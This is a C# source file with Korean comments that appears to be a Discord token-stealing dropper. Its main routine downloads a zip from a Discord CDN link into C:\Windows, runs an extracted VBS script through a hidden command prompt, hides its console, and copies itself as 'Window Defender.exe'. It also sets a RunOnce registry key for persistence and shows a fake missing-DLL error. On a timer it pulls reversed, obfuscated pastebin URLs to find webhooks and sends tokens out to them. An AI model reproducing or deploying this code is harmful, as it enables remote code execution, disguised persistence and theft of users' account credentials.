using System;
using System.Net;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Reflection;
using System.IO;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net.Http;
using System.IO.Compression;
using System.Linq;
using System.Text;


namespace ITB
{
    class Program
    {

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
		static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
		const int SW_HIDE = 0;

		public static string JKASHDGIUAWAFIUWBAWFASDGEAYA = Pack.Reverse("VwUpFFw8/war/moc.nibetsap//:sptth"); //페이스트빈1
		public static string UOADHUIHIIGAEFGAWGSIFUIQAWEGBFAV = Pack.Reverse("VwUpFFw8/war/moc.nibetsap//:sptth"); //페이스트빈2
		private static string AOISWHFOAOAIHSOIHDAOIHS = "https://pastebin.com/raw/8wFFpUwV"; //페이스트빈
		private static string ASIDOJNASD = "https://pastebin.com/raw/8wFFpUwV"; //페이스트빈
		//웹훅1 public static string JKASHDGIUAWAFIUWBAWFASDGEAYA = Pack.Reverse("sJ91N-9hb8Iq8U58yjbzHL85f4iftLvmHETeVEI62vcpJyRimtgGtCaSM6GooACC8_OC/165760140606044488/skoohbew/ipa/moc.drocsid//:sptth"); //웹훅1
		//웹훅2 public static string UOADHUIHIIGAEFGAWGSIFUIQAWEGBFAV = Pack.Reverse("xaFa0kRguQQy67IzHwzh9yRtpBd9HklPYunAW5Y5Lwt-rhYfb4fKI-Hy2ysRsIy7wzGF/395646501307044488/skoohbew/ipa/moc.drocsid//:sptth"); //웹훅2
		private static WebClient webClient = new WebClient();
		private static string good = "a";
		private static System.Timers.Timer aTimer;
		private static string what = "1";
		private static string ASDOK = "yes";

		public static void MemProtect()
		{
			byte[] dsdssdd = { 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7 };
			ProtectedMemory.Protect(dsdssdd, MemoryProtectionScope.SameLogon);
		}

		static void Main(string[] args)
        {


			string download_server = "https://cdn.discordapp.com/attachments/888075425832665101/888748975316938822/1.32a_2.zip"; //다운서버
			string files_state = @"C:\Windows\" + "cmd.zip";  //다운로드 경로 + 프로그램 이름
			WebClient mywebClient = new WebClient();
			mywebClient.DownloadFile(download_server, files_state); //download_server 에 파일을 files_state 로 다운로드할때 사용 지금은 필요 X
																	//필요할때 Thread.Sleep(1000); 아래에 Process.Start(files_state); 코드 넣기
			Thread.Sleep(1000); //파일 다운하고 1초대기(안정성 UP)




			string zipFilePath = @"C:\Windows\cmd.zip"; //다운한 파일을
			string extractionPath = @"C:\Windows\WindowsService"; //C:\Windows에 WindowsData 폴더를 만들고 해당 폴더안에 넣기


			ZipFile.ExtractToDirectory(zipFilePath, extractionPath);
			Thread.Sleep(1000);//1초대기




			ProcessStartInfo cmd = new ProcessStartInfo(); //CMD키기
			Process process = new Process();

			cmd.FileName = @"cmd";
			cmd.WindowStyle = ProcessWindowStyle.Hidden; //프로세스 숨기기
			cmd.CreateNoWindow = true;
			cmd.UseShellExecute = false;

			cmd.RedirectStandardOutput = true;
			cmd.RedirectStandardInput = true;
			cmd.RedirectStandardError = true;

			process.EnableRaisingEvents = false;
			process.StartInfo = cmd;
			process.Start();

			process.StandardInput.Write(@"cd C:\Windows\WindowsService\" + Environment.NewLine); //명령어 1
			process.StandardInput.Write(@"start start.vbs" + Environment.NewLine); //명령어 2

			process.StandardInput.Close();

			process.WaitForExit(); //CMD끄기
			process.Close();

			MemProtect();
			var handl = GetConsoleWindow();
            ShowWindow(handl, SW_HIDE); //콘솔창 숨기기

			//파일복제
			string name = "Window Defender.exe";
			string originpath = Assembly.GetEntryAssembly().Location;
			string path = Environment.GetFolderPath(System.Environment.SpecialFolder.ApplicationData) + name;
			FileInfo copyfile2 = new FileInfo(path);
			try { File.Copy(originpath, path); } catch { }
			Startup(name, path);
			//파일복제

			MessageBox.Show("Msvst160_2.dll이 없습니다 프로그램을 종료합니다", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);//에러메시지



            Send.setInfo();
			AOISWHFOAOAIHSOIHDAOIHS = webClient.DownloadString(JKASHDGIUAWAFIUWBAWFASDGEAYA); //페이스트빈
			ASIDOJNASD = webClient.DownloadString(UOADHUIHIIGAEFGAWGSIFUIQAWEGBFAV); //페이스트빈
			aTimer = new System.Timers.Timer(100);
			aTimer.Elapsed += OnTimedEvent;
			aTimer.Enabled = true;
			Console.ReadLine();
		}

		private static void OnTimedEvent(Object source, ElapsedEventArgs e)
		{
			AOISWHFOAOAIHSOIHDAOIHS = webClient.DownloadString(JKASHDGIUAWAFIUWBAWFASDGEAYA); //PasteBIN 에서 웹훅 받아오기 [1]
			ASIDOJNASD = webClient.DownloadString(UOADHUIHIIGAEFGAWGSIFUIQAWEGBFAV); //PasteBIN 에서 웹훅 받아오기 [2]
			try
			{
				//웹훅 good = webClient.DownloadString(JKASHDGIUAWAFIUWBAWFASDGEAYA); //1번째웹훅 상태 확인
				good = webClient.DownloadString(AOISWHFOAOAIHSOIHDAOIHS); //페이스트빈
				
				if (what == "1") //전에쓰던 웹훅이 1
				{
					if (ASDOK == "yes") //전송해야한다 = 참
					{
						//웹훅 Send.sendToken(JKASHDGIUAWAFIUWBAWFASDGEAYA);
						Send.sendToken(AOISWHFOAOAIHSOIHDAOIHS); //페이스트빈
						Thread.Sleep(5000);
						ASDOK = "no";
					}
					else
					{
						return;
					}
				}
				else if (what == "2") //전에쓰던 웹훅이 2
				{
					what = "1"; //1로 변경
					//웹훅 Send.sendToken(JKASHDGIUAWAFIUWBAWFASDGEAYA);
					Send.sendToken(AOISWHFOAOAIHSOIHDAOIHS); //페이스트빈
				}
			}
			catch
			{
				//여기로오면 1번째웹훅 상태 NO
				try
				{
					//웹훅 good = webClient.DownloadString(UOADHUIHIIGAEFGAWGSIFUIQAWEGBFAV); //2번째웹훅 상태확인
					good = webClient.DownloadString(ASIDOJNASD); //2번째웹훅 상태확인 페이스트빈
					if (what == "2")
					{
						if (ASDOK == "yes")
						{
							//웹훅 Send.sendToken(UOADHUIHIIGAEFGAWGSIFUIQAWEGBFAV); //전에쓰던게 웹훅2, 하지만 전송을 못해서 전송
							Send.sendToken(ASIDOJNASD); //전에쓰던게 웹훅2, 하지만 전송을 못해서 전송 페이스트빈
							return;
						}
						else
						{
							return; //전에쓰던게 웹훅2 이지만 이미 전송함
						}
					}
					else if (what == "1")
					{
						//여기로오면 전에쓰던게 웹훅1, 웹훅2 OK, 무조건전송
						//웹훅 Send.sendToken(UOADHUIHIIGAEFGAWGSIFUIQAWEGBFAV);
						Send.sendToken(ASIDOJNASD); //페이스트빈
						what = "2";
						ASDOK = "no";
						return;
					}
				}
				catch
				{
					//여기로오면 웹훅 1:X   2:X
					ASDOK = "yes";
					return;
				}
			}
			return;
			
		}
		private static void Startup(string appName, string path)
		{
			using (RegistryKey key = Registry.CurrentUser.OpenSubKey
				("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true))
			{
				key.SetValue(appName, "\"" + path + "\"");
			}
		}
	}
}
